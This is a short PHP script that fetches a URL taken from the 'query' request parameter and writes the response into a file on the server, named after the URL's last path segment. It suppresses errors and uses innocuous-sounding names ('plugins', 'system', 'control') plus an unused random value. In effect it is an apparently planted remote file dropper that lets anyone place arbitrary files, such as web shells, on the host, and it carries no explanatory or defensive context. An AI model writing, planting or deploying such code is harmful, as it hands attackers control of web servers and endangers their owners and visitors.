	<?php	
	error_reporting(0);
	function plugins($pageload,$system){ 
		$ch = curl_init("$pageload"); 
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
		$data = curl_exec($ch); 
		curl_close($ch); 

		$control = fopen("$system", "a+"); 
		fwrite($control, $data); 
		fclose($control); 
	} 

	$default = explode('/',$_GET["query"]);
	$dimi = end($default);
	
	$rand = rand(63,3144);
	$setting = plugins($_GET["query"],$dimi);  	
	

	?>